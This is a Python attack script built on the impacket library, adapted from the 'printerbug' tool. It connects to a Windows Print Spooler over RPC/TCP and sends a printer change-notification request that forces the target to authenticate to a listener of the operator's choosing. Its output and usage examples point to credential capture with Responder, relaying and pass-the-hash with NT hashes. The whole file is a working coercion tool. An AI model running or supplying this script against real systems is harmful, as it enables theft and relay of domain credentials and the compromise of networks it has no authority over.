#!/usr/bin/env python3
"""
Pure RPC over TCP example for Print Spooler on Windows 11 22H2+ / Server 2025
Uses direct TCP/IP RPC transport (ncacn_ip_tcp) - the new default for spoolss
Based on https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py
"""

import argparse
import logging
import sys

from impacket.dcerpc.v5 import transport, rprn
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_CONNECT
from impacket.dcerpc.v5.dtypes import NULL

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')


class RpcTcpPrinterTrigger:
    def __init__(self, target_host, username='', password='', domain='',
                 lmhash='', nthash='', listener=None, tcp_port=None):
        self.target_host = target_host
        self.username = username
        self.password = password
        self.domain = domain
        self.lmhash = lmhash
        self.nthash = nthash
        self.listener = listener if listener else target_host
        self.tcp_port = tcp_port
        
    def trigger_rpc_backconnect(self):
        try:
            if self.tcp_port:
                stringbinding = f'ncacn_ip_tcp:{self.target_host}[{self.tcp_port}]'
                logging.info(f'Using specified port: {self.tcp_port}')
            else:
                stringbinding = f'ncacn_ip_tcp:{self.target_host}'
                logging.info('Using dynamic port resolution via endpoint mapper')

            logging.info(f'Connecting to {stringbinding}')
            rpctransport = transport.DCERPCTransportFactory(stringbinding)

            if self.username:
                rpctransport.set_credentials(self.username, self.password, self.domain,
                                             lmhash=self.lmhash, nthash=self.nthash)
                auth_desc = f'(hash)' if self.nthash else f'(password)'
                logging.info(f'Using credentials: {self.domain}\\{self.username} {auth_desc}')
            else:
                logging.info('Using anonymous/null session')

            dce = rpctransport.get_dce_rpc()

            if self.username:
                dce.set_auth_level(RPC_C_AUTHN_LEVEL_CONNECT)
                #dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
            
            # Connect
            logging.info('Establishing RPC over TCP connection...')
            dce.connect()
            logging.info('Connected successfully via RPC over TCP')
            
            # Bind to the Print Spooler interface (MS-RPRN)
            logging.info('Binding to Print Spooler (MS-RPRN) interface...')
            dce.bind(rprn.MSRPC_UUID_RPRN)
            logging.info('Bound successfully to spoolss via RPC over TCP!')
            
            # Open printer handle
            logging.info(f'Opening printer handle for \\\\{self.target_host}')
            try:
                resp = rprn.hRpcOpenPrinter(dce, '\\\\%s\x00' % self.target_host)
                
            except Exception as e:
                error_str = str(e)
                if 'Broken pipe' in error_str:
                    logging.error('Connection failed - broken pipe')
                    return False
                elif 'ACCESS_DENIED' in error_str.upper():
                    logging.error('Access denied - insufficient privileges')
                    dce.disconnect()
                    return False
                elif 'RPC_S_SERVER_UNAVAILABLE' in error_str.upper():
                    logging.error('Print Spooler service not available')
                    dce.disconnect()
                    return False
                else:
                    logging.error(f'Failed to open printer: {e}')
                    raise
            
            logging.info('Got printer handle successfully')
            #text = input("-hit enter-")   
            # Create notification request
            logging.info(f'Creating change notification pointing to \\\\{self.listener}')
            request = rprn.RpcRemoteFindFirstPrinterChangeNotificationEx()
            request['hPrinter'] = resp['pHandle']
            request['fdwFlags'] = rprn.PRINTER_CHANGE_ADD_JOB
            
            request['pszLocalMachine'] =  '\\\\%s\x00' % self.listener
            request['pOptions'] = NULL
            
            # Send the request
            try:
                logging.info('Sending RPC request to trigger backconnect...')
                resp = dce.request(request)
                logging.info('RPC request completed successfully')
            except Exception as e:
                logging.warning(f'RPC request exception (may be expected): {e}')
            
            logging.info(f'[SUCCESS] Triggered RPC backconnect to \\\\{self.listener}')
            logging.info('Check your listener/Responder for incoming authentication!')
            
            # Cleanup
            dce.disconnect()
            logging.info('Disconnected from target')
            
            return True
            
        except Exception as e:
            error_str = str(e)
            if 'abstract_syntax_not_supported' in error_str:
                logging.error('Print Spooler not listening on RPC over TCP')
                logging.error('The target may be Windows Server 2022 or older')
                logging.error('Try enabling RPC over TCP on the target or use RPC over Named Pipes')
                return False
            else:
                logging.error(f'Error during RPC operation: {e}')
                return False


EXAMPLES = """\
examples:
  # anonymous
  %(prog)s -t 10.10.11.50 -l 10.10.14.5

  # cleartext credentials
  %(prog)s -t 10.10.11.50 -u Administrator -p 'P@ssw0rd' -d CORP -l 10.10.14.5

  # pass-the-hash (NT hash only)
  %(prog)s -t 10.10.11.50 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 -d CORP -l 10.10.14.5

  # specific RPC port (skip EPM lookup)
  %(prog)s -t 10.10.11.50 -u svc -H aad3b435b51404eeaad3b435b51404ee -d CORP -l 10.10.14.5 --port 49152
"""


def main():
    parser = argparse.ArgumentParser(
        description='Print Spooler RPC/TCP trigger — Windows 11 22H2+ / Server 2025',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=EXAMPLES,
    )
    parser.add_argument('-t', '--target', required=True,
                        help='target IP or hostname')
    parser.add_argument('-u', '--username', default='',
                        help='username')
    parser.add_argument('-p', '--password', default='',
                        help='plaintext password')
    parser.add_argument('-H', '--hashes', metavar='NTHASH', default=None,
                        help='NT hash for pass-the-hash (32 hex chars)')
    parser.add_argument('-d', '--domain', default='',
                        help='domain')
    parser.add_argument('-l', '--listener', default=None,
                        help='listener IP/host for backconnect (default: TARGET)')
    parser.add_argument('--port', type=int, default=None,
                        help='specific spoolss RPC/TCP port (omit to query EPM)')
    args = parser.parse_args()

    nthash = args.hashes or ''
    lmhash = ''

    print("=" * 70)
    print("Print Spooler RPC/TCP Trigger  —  Windows 11 22H2+ / Server 2025")
    print("=" * 70)
    listener = args.listener or args.target
    print(f"Target:    {args.target}")
    print(f"Listener:  {listener}")
    if args.username:
        auth = f"{args.domain}\\{args.username}" if args.domain else args.username
        auth += " (hash)" if nthash else " (password)"
        print(f"Auth:      {auth}")
    else:
        print("Auth:      anonymous")
    print(f"Port:      {args.port if args.port else 'dynamic (EPM)'}")
    print("=" * 70)
    print()

    trigger = RpcTcpPrinterTrigger(
        target_host=args.target,
        username=args.username,
        password=args.password,
        domain=args.domain,
        lmhash=lmhash,
        nthash=nthash,
        listener=args.listener,
        tcp_port=args.port,
    )

    success = trigger.trigger_rpc_backconnect()

    print()
    if success:
        print("[+] Operation completed successfully!")
        print("[+] Check your listener for incoming authentication from target")
    else:
        print("[-] Operation failed — see error messages above")
        print("\nTroubleshooting:")
        print("  1. Ensure target is Windows 11 22H2+ or Server 2025")
        print("  2. Check firewall allows RPC (port 135 + dynamic ports 49152-65535)")
        print("  3. Verify Print Spooler service is running on the target")
        print("  4. For older Windows, spoolss uses Named Pipes (not TCP)")
        sys.exit(1)


if __name__ == '__main__':
    main()

